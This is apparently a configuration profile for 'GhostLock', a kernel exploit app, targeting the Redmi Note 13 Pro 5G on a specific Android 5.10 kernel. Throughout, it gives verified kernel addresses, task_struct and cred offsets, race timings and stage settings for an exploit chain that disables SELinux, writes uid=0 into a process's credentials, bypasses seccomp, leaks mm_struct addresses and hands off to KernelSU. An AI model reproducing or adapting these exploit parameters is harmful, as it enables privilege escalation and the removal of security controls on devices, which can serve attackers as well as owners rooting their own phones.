# =====================================================================
# GhostLock kernel profile — Redmi Note 13 Pro 5G (garnet, SM7435)
# Kernel: 5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284
# Base template: Redmi K50 Ultra (diting, SM8475) — same 5.10.236 GKI.
#
# ⚠️ EXPERIMENTAL BUILD — caps_count=3 and collisions=4
# These two values follow PR #721 (YuKongA/ghostlock-app) recommendations
# and have NOT been verified on garnet. The previous profile (caps_count=5,
# collisions=8) succeeded 3/3 on garnet. If this build fails, revert to
# the proven values.
#
# Evidence for other values: 3 successful on-device logs (2026-10-26,
# 2026-10-28, 2026-11-01) and 1 failed log (2026-11-01, used the wrong
# profile B).
#
# Rejected values (proven to fail or unverified on garnet):
#   - kernel_phys_load   = 0xA7F00000  -> failed W1 15/15 (0x10000 shift)
#   - kernel_phys_offset = 0x80600000  -> UEFI-derived, never appeared in a
#                                         successful run; must be 0x80000000
#   - slide_nfulnl_logger= 41490232    -> only in the failed run; 41489208
#                                         is proven
#   - task_struct/cred   = null        -> extractor v2 output before PR #721
#                                         fix; unusable
# =====================================================================
release = "5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284"
schema_version = 1
kernel_major = 5
recommend_shizuku = 0

# ---------------------------------------------------------------------
# CRITICAL VALUES — all confirmed on garnet by 3 successful logs
# ---------------------------------------------------------------------
# kernel_phys_load:
#   0xA8000000 (2818572288) = physical start of "Kernel code" (_stext).
#   Confirmed on garnet by 3 successful logs:
#     init_cred alias = ffffff802a7b0a60
#     W1 target       = ffffff802aa42b90
#     delta           = 0x28000000
#   REJECTED: 0xA7F00000 (2818506752). The one run that used it failed
#   all 15 W1 attempts with "route returned clean but the write did not
#   verify" because every address was shifted by 0x10000.
kernel_phys_load = 2818572288

# kernel_phys_offset:
#   0x80000000 (2147483648) = DRAM base for Qualcomm SoCs. Present in
#   every garnet log (successful and failed) as phys_offset=0000000080000000.
#   REJECTED: 0x80600000 (2154037248). The extractor emits it from the
#   UEFI memory map (PR #721 "Known issue": kernel_phys_offset has no
#   guard and is overwritten from whatever iomem source is readable).
#   It never appeared in any successful garnet run.
kernel_phys_offset = 2147483648

route {
  select_stack {
    # Frame geometry: pselect uses 0xa0+0x1c0, futex uses 0x90+0x70+0x1a0;
    # both objects land at stack depth 0x210, so the delta is 0 and the
    # waiter shift is -2. Confirmed by kprobe trace 2026-10-08.
    waiter_shift = -2
    compact_waiter = 1

    # .bss anchor: image offset 0x2a3a590 (44279184). Zero, writable,
    # reference-free region (fs/coredump.c). Confirmed on garnet: every
    # successful W1p/W2/W3 used image +0x2a3a590.
    # Delete this line to fall back to the reclaimed-page behaviour.
    lock_anchor_image = 44279184

    # 0x1000 = 4096 is the anchor array itself. 0x20 = 32 is
    # sizeof(struct rt_mutex) under this build's lock-debug config.
    # 4096/32 = 128 slots per boot.
    lock_anchor_bytes = 4096
    lock_anchor_stride = 32
  }
}

fallback {
  to = "none"
}

# =====================================================================
# EXECUTION — timing, CPU pair, stages, heap, handoff
# =====================================================================
execution {
  # Preferred CPUs: 4/5 (big cores) = faster race (~40s runs).
  # On garnet, both pairs work in successful logs:
  #   - 4/5 accepted in run 3 (~40s total).
  #   - 0/1 accepted in runs 1 and 4 (~47-72s total).
  # When 4/5 is rejected by the cpuset, the app falls back to 0/1
  # automatically. Source: https://github.com/Haoyu-UT/robust-ghostlock-app
  # "Fully page-free" table: Redmi K50 Ultra (diting) 5.10.236 select_stack
  # completed 10/10 in 13.8–15.9 s.
  selected_cpus {
    main = 4
    consumer = 5
  }
  recommended_cpus {
    main = 0
    consumer = 1
  }

  race {
    # Waiter park timeout and settle window. The exposure window is
    # exactly (route_wait_ms - setup_settle_us) = 30 - 10 = 20ms.
    # Requeue lands at settle+1.3ms in every kprobe trace.
    # Confirmed on garnet: all 3 successful logs show 30 / 10000.
    # Source: https://github.com/Haoyu-UT/robust-ghostlock-app
    #   "A stage that cannot finish stops. ... A stage that cannot
    #    complete now stops and reports where it stopped."
    # Revert: route_wait_ms = 100, setup_settle_us = 50000.
    route_wait_ms = 30
    setup_settle_us = 10000

    # Poll interval and overall timeout for the state machine.
    state_poll_interval_us = 1000
    route_done_timeout_ms = 300000
  }

  routes {
    select_stack {
      # Attempt-1 consumer walk fires 5ms after route start.
      # Values <5ms (tested 2ms) cause rb_insert_color NULL-deref because
      # the walk runs before the erase pollutes the tree. Values >5ms let
      # ambient touchers hit the detach residue.
      # Confirmed on garnet: all 3 successful logs show 5000.
      # Source: https://github.com/Haoyu-UT/robust-ghostlock-app
      #   "The main routes no longer depend on a sprayed page. ... The lock
      #    used for the write now sits in a fixed, all-zero region of the
      #    kernel."
      #   "A correct profile runs at the full success rate its route is
      #    capable of."
      enter_delay_us = 5000
      consumer_max_calls = 1
      consumer_burst_calls = 1
      timeout_us = 200000
    }
  }

  stages {
    # W1 (SELinux): skipped entirely if the device is already permissive
    # (seen in garnet runs 3 and 4). Otherwise up to 15 attempts.
    w1_attempts = 15
    w1_settle_us = 100000
    w1_scratch_repair_attempts = 3

    # W2 (cred): writes uid=0 into the child task's cred.
    # Confirmed on garnet: run 1 needed 1 attempt, run 4 needed 1 attempt.
    w2_attempts = 15
    w2_settle_us = 100000

    # W3 (seccomp): up to 3 chain rounds, 6 attempts each.
    # Confirmed on garnet: all 3 successful logs completed W3 on attempt 1.
    w3_chain_rounds = 3
    w3_attempts = 6
    w3_settle_us = 50000
  }

  heap {
    # prepare_max_attempts=4 was needed on garnet: run 1 required 3
    # attempts, run 4 required 4. Lowering it to 2 would have failed.
    prepare_max_attempts = 4
    prepare_timeout_ms = 240000
    kernelsnitch_timeout_ms = 60000
  }

  handoff {
    # Wait for the module to load after the exploit completes.
    # Confirmed on garnet: KernelSU loaded in all 3 successful logs.
    pre_dispatch_settle_ms = 2000
    module_poll_attempts = 30
    module_poll_interval_ms = 100
    enforce_poll_attempts = 200
    enforce_poll_interval_ms = 100
  }
}

# =====================================================================
# KERNELSNITCH — mm_struct leak geometry
# =====================================================================
kernelsnitch {
  # ⚠️ EXPERIMENTAL: collisions=4 (PR #721 recommendation for 5.10).
  # The proven value on garnet is 8 (3/3 successful logs).
  # If this run fails at the KernelSnitch mm_struct leak stage, revert
  # to collisions=8. PR #721 lowers it to 4 because it measured 4
  # collisions on its 5.10.198 test image; that has not been confirmed
  # on 5.10.236 garnet.
  collisions = 8

  # 960 bytes = device-measured SLUB stride (0x3c0) for mm_struct on 5.10.
  # PR #721 confirms: three unrelated 5.10 images pass 0x3c0 to
  # kmem_cache_create_usercopy in mm_cache_init. The 1024/1280 values are
  # template defaults or Sony-specific and made the leak fail.
  mm_struct_sz = 960
}

# =====================================================================
# TASK_STRUCT — offsets verified via live kprobe reads
# =====================================================================
task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 784
  pi_lock = 2156
  pi_waiters = 2176
  pi_top_task = 2192
  pi_blocked_on = 2200
  pid = 1480
  tgid = 1484
  atomic_flags = 1424
  real_cred = 1912
  cred = 1920
  comm = 1936
  tasks = 1224
  seccomp = 2120
}

# =====================================================================
# CRED — capability block
# =====================================================================
cred {
  # 168 bytes = confirmed via /sys/kernel/slab/cred_jar/object_size.
  copy_size = 168

  # refcount pinned at 256 so the rooted cred can never be freed
  # ("immortal this boot" in every successful garnet run).
  usage_offset = 0
  usage_value = 256

  # ⚠️ EXPERIMENTAL: caps_count=3 (PR #721 measured value from init_cred).
  # PR #721 says the real init_cred run yields caps_count=3 with
  # caps_value=0x1ffffffffff. The previous profile used caps_count=5 and
  # succeeded 3/3 on garnet. If this run fails at W2 (child not root) or
  # produces an incomplete capability set, revert to caps_count=5.
  caps_offset = 40
  caps_count = 5
  caps_value = 2199023255551

  # Three ref* pointers rebased to KIMAGE_TEXT_BASE (0xffffffc080000000)
  # so data_alias() accepts them. Confirmed on garnet: ref0/ref1/ref2
  # matched live kprobe reads in all 3 successful runs.
  ref_count = 3
  ref0_offset = 128
  ref0_image = -272688810528
  ref1_offset = 136
  ref1_image = -272688810376
  ref2_offset = 144
  ref2_image = -272688805112
  ref3_offset = 0
  ref3_image = 0
}

# =====================================================================
# OFFSET — symbol offsets from _text (verified vs /proc/kallsyms)
# =====================================================================
offset {
  init_task = 41533056
  init_cred = 41618016
  empty_zero_page = 43573248
  root_task_group = 43593792
  selinux_enforcing = 44313488
  selinux_blob_sizes = 36659328
  security_hook_heads = 36657640

  # slide_nfulnl_logger: 0x2791C38 (41489208). Required for slide
  # detection. REJECTED: 0x2792038 (41490232) appeared only in the
  # failed run and shifted the logger by 0x400.
  # PR #721 fixed off_slide_loggers_0_1 from loggers+0x10 to loggers+8.
  slide_nfulnl_logger = 41489208

  # slide_loggers_0_1: 0x2791BF0 (41489008). Required for the
  # loggers+0x10 heuristic fallback when BTF is unavailable.
  # Confirmed on garnet: matched in all 3 successful logs.
  slide_loggers_0_1 = 41489008

  slide_boot_id = 44440509
}
